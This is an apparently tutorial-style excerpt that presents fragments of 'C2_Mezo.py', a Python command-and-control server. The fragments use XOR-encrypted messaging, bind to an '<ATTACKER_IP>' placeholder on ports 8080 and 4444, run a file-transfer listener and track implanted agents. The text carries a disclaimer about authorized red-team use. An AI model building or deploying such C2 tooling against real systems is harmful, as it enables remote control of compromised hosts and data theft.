...
Before we begin, a crucial disclaimer: This educational project is designed for:

- Cybersecurity professionals conducting authorized penetration tests
- Red team operators building custom tooling for exercises
- Students and researchers understanding defensive techniques
- Security engineers improving detection capabilities

Always ensure you have proper authorization before deploying any security testing tools.
...
C2_Mezo.py - Simple XOR Encrypted Command and Control Server
...
def \__init_\_(self, key: str = "&lt;XOR Key&gt;"):

self.key = key

def encrypt_message(self, plaintext: dict) -> str:

_\# Convert dict to JSON string_

plaintext_str = json.dumps(plaintext)

plaintext_bytes = plaintext_str.encode('utf-8')

_\# XOR encrypt byte by byte_
...
_\# Add checksum for integrity verification_
...
status: str = "pending" _\# pending, running, completed, failed_
...
def \__init_\_(self, host='&lt;ATTACKER_IP&gt;', http_port=8080, tcp_port=4444,
...
_\# Start File Transfer Listener_
...
encrypted_response = self.handle_encrypted_checkin(encrypted_data, client_address\[0\], 'http')
...
if total_received > 10 \* 1024 \* 1024: _\# 10MB limit_
...
with self.\_lock: _\# Thread-safe operation_

agent_id = agent_data.get('agent_id')

if not agent_id or agent_id not in self.agents:

_\# New agent registration_
...
if current_time - agent.last_seen > 300: _\# 5 minutes_

if agent.status == AgentStatus.ACTIVE:

agent.status = AgentStatus.LOST

elif current_time - agent.last_seen > 1800: _\# 30 minutes_
